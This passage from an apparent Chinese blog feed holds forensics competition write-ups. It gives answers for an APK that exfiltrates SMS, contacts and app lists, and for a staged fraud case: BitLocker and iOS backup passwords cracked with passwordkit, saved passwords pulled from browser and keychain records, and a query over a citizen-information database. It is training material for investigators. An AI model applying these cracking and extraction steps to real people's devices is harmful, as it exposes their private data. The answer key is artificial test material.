src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302246956.png" alt="image-20240130224622886"></p><p>找到回传的文件名称</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302251601.png" alt="image-20240130225117514"></p><h4 id="8、APK回传数据加密密码是多少。（标准格式：admin）"><a href="#8、APK回传数据加密密码是多少。（标准格式：admin）" class="headerlink" title="8、APK回传数据加密密码是多少。（标准格式：admin）"></a>8、APK回传数据加密密码是多少。（标准格式：admin）</h4><pre><code>19_08.05r</code></pre><p>在<code>EncryFile</code>函数里面找到加密密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291940534.png" alt="image-20240129194032489"></p><h4 id="9、APK发送回后台服务器的数据包含以下哪些内容？（多选）"><a href="#9、APK发送回后台服务器的数据包含以下哪些内容？（多选）" class="headerlink" title="9、APK发送回后台服务器的数据包含以下哪些内容？（多选）"></a>9、APK发送回后台服务器的数据包含以下哪些内容？（多选）</h4><pre><code>A．手机通讯录B.手机短信C.相册D.GPS定位信息E.手机应用列表</code></pre><pre><code>ABE</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291945666.png" alt="image-20240129194512621"></p><p>分别对应 短信、通讯录、手机应用</p><p>也可以分析第7题抓包得到的压缩包 解压密码已经在第8题得到了 直接解压回传的<code>Readdata.zip </code>得到readdata.xml 这里面有提到通讯录、手机短信、应用列表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302255859.png" alt="image-20240130225514767"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024獬豸杯&quot;&gt;&lt;a href=&quot;#2024獬豸杯&quot; class=&quot;headerlink&quot; title=&quot;2024獬豸杯&quot;&gt;&lt;/a&gt;2024獬豸杯&lt;/h1&gt;&lt;h2 id=&quot;手机备份包&quot;&gt;&lt;a href=&quot;#手机备份包&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2023第四届中科实数杯</title>
    <link href="http://w3nx1z1.github.io/2024/01/13/2023%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/01/13/2023%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF/</id>
    <published>2024-01-12T16:29:53.586Z</published>
    <updated>2024-01-15T09:17:02.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023中科实数杯"><a href="#2023中科实数杯" class="headerlink" title="2023中科实数杯"></a>2023中科实数杯</h1><p>当时比赛在学校的训练馆里面 巨冷 直接被造成魔法伤害 还由于笔记本内存太小 火眼取证大师根本跑不动 导致最后时间很紧 队友爆出来bitlocker密钥的时候只剩20分钟了 sb答题系统还自动提交了我们答题少的那一台笔记本的答案 总之就是很憋屈的一场比赛(生理和心理上)</p><h2 id="案情介绍"><a href="#案情介绍" class="headerlink" title="案情介绍"></a>案情介绍</h2><pre><code>受害人报案，其被嫌疑人王某多次通过微信进行诈骗，对受害人手机进行快采后，公安机关根据已有线索，发现可能存在多个受害人被该嫌疑人通过同样的方式进行诈骗。公安机关现已将嫌疑人iphone手机、红米手机、电脑进行备份、镜像。检材1：嫌疑人的计算机磁盘镜像 检材2：嫌疑人的iphone备份数据 检材3：嫌疑人的计算机内存镜像 检材4：嫌疑人的红米手机备份数据</code></pre><h2 id="检材一：嫌疑人计算机"><a href="#检材一：嫌疑人计算机" class="headerlink" title="检材一：嫌疑人计算机"></a>检材一：嫌疑人计算机</h2><p>使用取证软件分析之后发现这个计算机镜像的C盘被锁了 基本上就是什么也取不出来 但是好在我们有内存文件</p><p>使用取证大师里面的内存镜像解析工具 解析一波bitlocker密码 很快就得到了bitlocker密钥文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401121857921.png" alt="image-20240112185721851"></p><p>使用密钥文件就可以在取证大师里面解密C盘 先进行取证 下面在使用passwordkit结合0计算机镜像和内存文件慢慢爆破bitlocker密钥</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401121859123.png" alt="image-20240112185911076"></p><h3 id="1-检材一硬盘的MD5值为"><a href="#1-检材一硬盘的MD5值为" class="headerlink" title="1.检材一硬盘的MD5值为"></a>1.检材一硬盘的MD5值为</h3><pre><code>80518BC0DBF3315F806E9EDF7EE13C12 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401121908962.png" alt="image-20240112190852922"></p><h3 id="2-检材一bitlocker的恢复密钥是多少？"><a href="#2-检材一bitlocker的恢复密钥是多少？" class="headerlink" title="2. 检材一bitlocker的恢复密钥是多少？"></a>2. 检材一bitlocker的恢复密钥是多少？</h3><p>使用passwordkit结合计算机镜像和内存镜像爆破出bitlocker密码为</p><pre><code>585805-292292-462539-352495-691284-509212-527219-095942</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122033157.png" alt="image-20240112203304074"></p><h3 id="3-检材一镜像中用户最近一次打开的文件名是什么？"><a href="#3-检材一镜像中用户最近一次打开的文件名是什么？" class="headerlink" title="3.检材一镜像中用户最近一次打开的文件名是什么？"></a>3.检材一镜像中用户最近一次打开的文件名是什么？</h3><p>使用爆破出的bitlocker密钥解密磁盘分区 使用取证工具进行分析</p><p>在火眼——最近访问的项目——筛选最后访问时间(按降序排列) </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122254418.png" alt="image-20240112225407340"></p><p>注意是最近一次打开的文件名 所以是第二行的<code>列表.xlsx</code></p><h3 id="4-检材一硬盘系统分区的起始位置？"><a href="#4-检材一硬盘系统分区的起始位置？" class="headerlink" title="4.检材一硬盘系统分区的起始位置？"></a>4.检材一硬盘系统分区的起始位置？</h3><pre><code>332398592</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122305799.png" alt="image-20240112230511764"></p><h3 id="5、检材一系统的版本号是多少（格式：x-x-x-x）（1分）"><a href="#5、检材一系统的版本号是多少（格式：x-x-x-x）（1分）" class="headerlink" title="5、检材一系统的版本号是多少（格式：x.x.x.x）（1分）"></a>5、检材一系统的版本号是多少（格式：x.x.x.x）（1分）</h3><pre><code>10.0.19042.508</code></pre><p>这道题还是官方wp写的方法更巧妙一点</p><p>我们在取证软件中看到的是<code>当前版本和当前build版本</code> 但这个并不全</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122308991.png" alt="image-20240112230834957"></p><p>但是题目的格式应该是有四位 那我们仿真起计算机 打开命令行就可以看到完整的系统版本号了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122329442.png" alt="image-20240112232959406"></p><h3 id="6、检材一回收站中的文件被删除前的路径（2分）"><a href="#6、检材一回收站中的文件被删除前的路径（2分）" class="headerlink" title="6、检材一回收站中的文件被删除前的路径（2分）"></a>6、检材一回收站中的文件被删除前的路径（2分）</h3><pre><code>C:/Users/rd/Desktop/iTunes(12.13.0.9).exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122330209.png" alt="image-20240112233030160"></p><h3 id="7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD-HH-MM-SS）（3分）"><a href="#7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD-HH-MM-SS）（3分）" class="headerlink" title="7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD HH:MM:SS）（3分）"></a>7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD HH:MM:SS）（3分）</h3><pre><code>2023-12-12 16:37:12</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122332543.png" alt="image-20240112233220464"></p><h3 id="8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><pre><code>2023-12-11 15:57:02</code></pre><p>在取证大师帐户登陆部分看到一个外部ip 那这就是远程连接的ip了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122338825.png" alt="image-20240112233820741"></p><h3 id="9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）"><a href="#9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）" class="headerlink" title="9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）"></a>9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）</h3><pre><code>常见的诈骗话术2023</code></pre><p>谷歌浏览器的搜索记录中筛选时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122341965.png" alt="image-20240112234107931"></p><h3 id="10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）"><a href="#10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）" class="headerlink" title="10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）"></a>10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）</h3><pre><code>FC2005927F271</code></pre><p>通过设备描述可以看出来只有aigo这个USB设备有挂载盘符 因此确定他是U盘 SN码就是设备序列号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122343246.png" alt="image-20240112234329173"></p><h3 id="11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）"><a href="#11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）" class="headerlink" title="11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）"></a>11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）</h3><pre><code>winrar-x64-624scp.exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122345049.png" alt="image-20240112234530962"></p><h3 id="12、嫌疑人访问的微博的密码的MD5值（3分）"><a href="#12、嫌疑人访问的微博的密码的MD5值（3分）" class="headerlink" title="12、嫌疑人访问的微博的密码的MD5值（3分）"></a>12、嫌疑人访问的微博的密码的MD5值（3分）</h3><pre><code>5cb42860b3b61ef6dd361ad556f48e05</code></pre><p>在谷歌浏览器中有保存微博账号登陆的密码 在进行md5加密即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122347382.png" alt="image-20240112234742310"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122347355.png" alt="image-20240112234758315"></p><h2 id="检材二：嫌疑人的iphone备份数据"><a href="#检材二：嫌疑人的iphone备份数据" class="headerlink" title="检材二：嫌疑人的iphone备份数据"></a>检材二：嫌疑人的iphone备份数据</h2><h3 id="13、检材二备份的设备名称是什么？（1分）"><a href="#13、检材二备份的设备名称是什么？（1分）" class="headerlink" title="13、检材二备份的设备名称是什么？（1分）"></a>13、检材二备份的设备名称是什么？（1分）</h3><pre><code>“User”的 iPhone</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131746598.png" alt="image-20240113174634555"></p><h3 id="14、检材二手机的IOS系统版本是多少（1分）"><a href="#14、检材二手机的IOS系统版本是多少（1分）" class="headerlink" title="14、检材二手机的IOS系统版本是多少（1分）"></a>14、检材二手机的IOS系统版本是多少（1分）</h3><pre><code>17.0</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131747999.png" alt="image-20240113174744955"></p><h3 id="15、检材二备份的时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（1分）"><a href="#15、检材二备份的时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（1分）" class="headerlink" title="15、检材二备份的时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（1分）"></a>15、检材二备份的时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（1分）</h3><pre><code>2023-12-09 15:02:28</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131752105.png" alt="image-20240113175248067"></p><h3 id="16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><p>在分析计算机镜像的时候 火眼识别出有一个ios的嵌套备份文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132203317.png" alt="image-20240113220317260"></p><p>我们跳转源文件 将这个备份提取出来 放到火眼里面在分析一下 提示是加密备份 需要密码</p><p>使用passwordkit进行爆破<code>Manifest.pslist</code>文件</p><p>爆破的范围我们在使用passwordkit分析内存镜像的时候可以看到是五位纯数字 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132217694.png" alt="image-20240113221736632"></p><p>最后爆破可得解密密钥为<code>25922</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132222482.png" alt="image-20240113222238398"></p><p>得到解密密钥之后 在火眼中进行解密在进行分析</p><p>找到通话记录 给号码“13502409024”最后一次打电话的时间是</p><pre><code>2023-12-04 13:18:50</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132236651.png" alt="image-20240113223657605"></p><h3 id="17、检材二使用过的号码ICCID是多少。（2分）"><a href="#17、检材二使用过的号码ICCID是多少。（2分）" class="headerlink" title="17、检材二使用过的号码ICCID是多少。（2分）"></a>17、检材二使用过的号码ICCID是多少。（2分）</h3><pre><code>89860000191997734908</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132238303.png" alt="image-20240113223800264"></p><h3 id="18、检材二手机中高德地图最后搜索的地址。（2分）"><a href="#18、检材二手机中高德地图最后搜索的地址。（2分）" class="headerlink" title="18、检材二手机中高德地图最后搜索的地址。（2分）"></a>18、检材二手机中高德地图最后搜索的地址。（2分）</h3><pre><code>万达广场(南沙店)双山大道3号</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131757076.png" alt="image-20240113175717029"></p><h3 id="19、检材二手机最后一次登陆-x2F-注册“HotsCoin”的时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分"><a href="#19、检材二手机最后一次登陆-x2F-注册“HotsCoin”的时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分" class="headerlink" title="19、检材二手机最后一次登陆&#x2F;注册“HotsCoin”的时间是（格式：YYYY-MM-DD HH:MM:SS）（2分)"></a>19、检材二手机最后一次登陆&#x2F;注册“HotsCoin”的时间是（格式：YYYY-MM-DD HH:MM:SS）（2分)</h3><pre><code>2023-12-04 13:28:14</code></pre><p>使用短信验证码登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132240226.png" alt="image-20240113224039190"></p><h3 id="20、检材二手机中照片“IMG-0002”的拍摄时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#20、检材二手机中照片“IMG-0002”的拍摄时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="20、检材二手机中照片“IMG_0002”的拍摄时间是（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>20、检材二手机中照片“IMG_0002”的拍摄时间是（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><pre><code>2023-12-06 11:08:30</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131757553.png" alt="image-20240113175751507"></p><h3 id="21、检材二中“小西米语音”app的Bundle-ID是什么？-（2分）"><a href="#21、检材二中“小西米语音”app的Bundle-ID是什么？-（2分）" class="headerlink" title="21、检材二中“小西米语音”app的Bundle ID是什么？ （2分）"></a>21、检材二中“小西米语音”app的Bundle ID是什么？ （2分）</h3><p>bundle id就是系统APP唯一识别id 其实就是app的包名</p><pre><code>com.titashow.tangliao</code></pre><h3 id="22、检材二中浏览器最后一次搜索的关键词是什么？（2分）"><a href="#22、检材二中浏览器最后一次搜索的关键词是什么？（2分）" class="headerlink" title="22、检材二中浏览器最后一次搜索的关键词是什么？（2分）"></a>22、检材二中浏览器最后一次搜索的关键词是什么？（2分）</h3><pre><code>ios备份密码忘了怎么办 五位纯数字</code></pre><p>Safari 的搜索记录保存在 <code>APP-Domain-com.apple.mobilesafari/Libarary/Preferences/com.apple.mobilesafari.plist</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142314680.png" alt="image-20240114231416643"></p><h3 id="23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）"><a href="#23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）" class="headerlink" title="23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）"></a>23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）</h3><pre><code>imToken、Bitcoin</code></pre><p>检材二中的微信聊天记录中并没有关于约定电子钱包的信息 在检材二这台苹果手机中下载的软件也只有UC浏览器 微信 高德地图 小西米语音 Hostcoin 那可以提供聊天记录的也就只有小西米语音了</p><p>小西米语音的聊天记录存放在<code>00008030-001619320C68802E\其他应用小西米语音—在线连麦社交平台\文件分类\SQLite文件\其他\im5db</code>中 我们使用navicat打开数据库 在<code>massage</code>表中可以看到聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142323868.png" alt="image-20240114232317815"></p><p>提到的电子钱包品牌是imToken和Bitcoin</p><h3 id="24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）"><a href="#24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）" class="headerlink" title="24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）"></a>24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）</h3><pre><code>0.2</code></pre><p>接上题  比例是0.2</p><h2 id="检材三：计算机内存镜像"><a href="#检材三：计算机内存镜像" class="headerlink" title="检材三：计算机内存镜像"></a>检材三：计算机内存镜像</h2><h3 id="25、检材三中进程“FTK-Imager-exe”的PID是多少？（2分）"><a href="#25、检材三中进程“FTK-Imager-exe”的PID是多少？（2分）" class="headerlink" title="25、检材三中进程“FTK Imager.exe”的PID是多少？（2分）"></a>25、检材三中进程“FTK Imager.exe”的PID是多少？（2分）</h3><pre><code>11328</code></pre><p>使用火眼的内存镜像分析工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132302766.png" alt="image-20240113230212675"></p><h3 id="26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><pre><code>2023-12-12 04:06:25</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132303631.png" alt="image-20240113230310542"></p><h3 id="27、检材三中记录的当前系统ip是多少？（2分）"><a href="#27、检材三中记录的当前系统ip是多少？（2分）" class="headerlink" title="27、检材三中记录的当前系统ip是多少？（2分）"></a>27、检材三中记录的当前系统ip是多少？（2分）</h3><pre><code>172.18.7.229</code></pre><p>使用取证大师的内存镜像解析工具分析内存镜像的网络连接情况 找到本地ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132312091.png" alt="image-20240113231203050"></p><h2 id="检材四：嫌疑人的红米手机备份数据"><a href="#检材四：嫌疑人的红米手机备份数据" class="headerlink" title="检材四：嫌疑人的红米手机备份数据"></a>检材四：嫌疑人的红米手机备份数据</h2><p>检材四是红米手机备份文件 给的文件夹里面有手机应用的备份bak文件还有一个综述性文件<code>descript.xml</code> 里面内容是备份应用和备份手机的相关信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141733567.png" alt="image-20240114173334496"></p><p>应用具体信息应该就在.bak文件中 使用7zip可以将这些bak文件解压 在解压后的文件夹中还可以找到对应app的安装包apk文件 类似下图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141813778.png" alt="image-20240114181324713"></p><p>将全部的应用bak文件使用7zip解压完毕 就可以将文件集合直接丢到火眼里面自动分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141814278.png" alt="image-20240114181425183"></p><h3 id="28、检材四中迅雷下载过的文件名是什么？（1分）"><a href="#28、检材四中迅雷下载过的文件名是什么？（1分）" class="headerlink" title="28、检材四中迅雷下载过的文件名是什么？（1分）"></a>28、检材四中迅雷下载过的文件名是什么？（1分）</h3><pre><code>《向银河靠近》.txt</code></pre><p>找到迅雷下载过的文件名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141815830.png" alt="image-20240114181550701"></p><h3 id="29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）"><a href="#29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）" class="headerlink" title="29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）"></a>29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）</h3><pre><code>Clash</code></pre><p>分析出来的应用中只有Clash一款vpn应用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141817044.png" alt="image-20240114181721956"></p><h3 id="30、检材四备份的设备系统版本是多少？（1分）"><a href="#30、检材四备份的设备系统版本是多少？（1分）" class="headerlink" title="30、检材四备份的设备系统版本是多少？（1分）"></a>30、检材四备份的设备系统版本是多少？（1分）</h3><pre><code>V14.0.2.0.TKSCNXM</code></pre><p>在<code>descript.xml</code>文件里面找到设备系统版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141818848.png" alt="image-20240114181856726"></p><h3 id="31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）"><a href="#31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）" class="headerlink" title="31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）"></a>31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）</h3><pre><code>1702459232429</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141819699.png" alt="image-20240114181946660"></p><h3 id="32、检材四中FileCompress-app-包名是什么？（1分）"><a href="#32、检材四中FileCompress-app-包名是什么？（1分）" class="headerlink" title="32、检材四中FileCompress app 包名是什么？（1分）"></a>32、检材四中FileCompress app 包名是什么？（1分）</h3><pre><code>com.zs.filecompress</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141820504.png" alt="image-20240114182015472"></p><h3 id="33、检材四中备忘录记录的内容是什么？（1分）"><a href="#33、检材四中备忘录记录的内容是什么？（1分）" class="headerlink" title="33、检材四中备忘录记录的内容是什么？（1分）"></a>33、检材四中备忘录记录的内容是什么？（1分）</h3><pre><code>Vcpswd:edgewallet</code></pre><p>给出的应用中并没有备忘录 是因为小米手机里面的备忘录就是笔记 火眼分析之后给出的名字叫便签 其实都是一个东西</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141824917.png" alt="image-20240114182451871"></p><h3 id="34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）"><a href="#34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）" class="headerlink" title="34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）"></a>34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）</h3><pre><code>de.schildbach.wallet、com.bitcoin.mwallet、 piuk.blockchain.android、im.token.app、com.paxful.wallet、pro.huobi</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141827195.png" alt="image-20240114182713135"></p><h3 id="35、检材四中嫌疑人使用Bitcoin-Wallet钱包地址是什么？（3分）"><a href="#35、检材四中嫌疑人使用Bitcoin-Wallet钱包地址是什么？（3分）" class="headerlink" title="35、检材四中嫌疑人使用Bitcoin Wallet钱包地址是什么？（3分）"></a>35、检材四中嫌疑人使用Bitcoin Wallet钱包地址是什么？（3分）</h3><pre><code>bc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt</code></pre><p>在<code>Bitcoin Wallet(de.schildbach.wallet)\apps\de.schildbach.wallet\f\log\wallet.log</code>中搜索<code>address</code>找到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141841378.png" alt="image-20240114184143339"></p><h3 id="36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）"><a href="#36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）" class="headerlink" title="36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）"></a>36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）</h3><pre><code>FileCompress(com.zs.filecompress)/FileCompress/11月.txt</code></pre><p>使用火眼哈希值计算工具批量计算检材四和bak文件解压出来的应用文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142205682.png" alt="image-20240114220539617"></p><p>将计算结果进行导出 搜索目标哈希值 找到对应文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142206759.png" alt="image-20240114220638668"></p><h2 id="综合题目"><a href="#综合题目" class="headerlink" title="综合题目"></a>综合题目</h2><h3 id="37、检材中受害人的微信号是多少？（2分）"><a href="#37、检材中受害人的微信号是多少？（2分）" class="headerlink" title="37、检材中受害人的微信号是多少？（2分）"></a>37、检材中受害人的微信号是多少？（2分）</h3><pre><code>B-I-N-A-R-Y</code></pre><p>在嫌疑人的苹果手机的微信记录中有受害人的微信号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132314793.png" alt="image-20240113231439720"></p><h3 id="38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）"><a href="#38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）" class="headerlink" title="38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）"></a>38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）</h3><pre><code>章敏</code></pre><p>在嫌疑人的苹果手机微信聊天记录中显示嫌疑人从枫叶的手上购买过数据库  文件名为<code>database.sqlite </code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132316046.png" alt="image-20240113231632972"></p><p>这个名字的数据库在检材二中是找不到的 但是在检材一计算机的微信下载记录中可以找到名为<code>database(1).sqlite</code>的数据库文件 结合检材二微信聊天记录中枫叶前后给嫌疑人发了两次数据库文件 第二次为正确的 因为两次发送的数据库名字都是<code>database.sqlite</code> 因此第二次嫌疑人下载数据库文件的时候 名字自然就是<code>database(1).sqlite</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132323262.png" alt="image-20240113232357169"></p><p>我们导出这个文件 在Navicat中打开 就可以找到手机尾号是8686的用户的姓名是章敏</p><h3 id="39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）"><a href="#39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）" class="headerlink" title="39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）"></a>39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）</h3><pre><code>jamvU1@wiwgug$bo</code></pre><p>在检材一 的钥匙串——网站与应用密码里面 找到了小西米语音的包名对应的就是账号密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142354168.png" alt="image-20240114235414125"></p><h3 id="40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）"><a href="#40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）" class="headerlink" title="40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）"></a>40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）</h3><pre><code>1717</code></pre><p>使用sql语句在第38题找到的公民信息数据库中查找</p><pre><code class="sql">SELECT COUNT(*) AS user_countFROM usersWHERE     strftime(&#39;%Y&#39;, &#39;2023-12-31&#39;) - SUBSTR(IDCARD, 7, 4) BETWEEN 18 AND 30;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151652323.png" alt="image-20240115165228270"></p><h3 id="41、受害人小浩的手机号码是多少（5分）"><a href="#41、受害人小浩的手机号码是多少（5分）" class="headerlink" 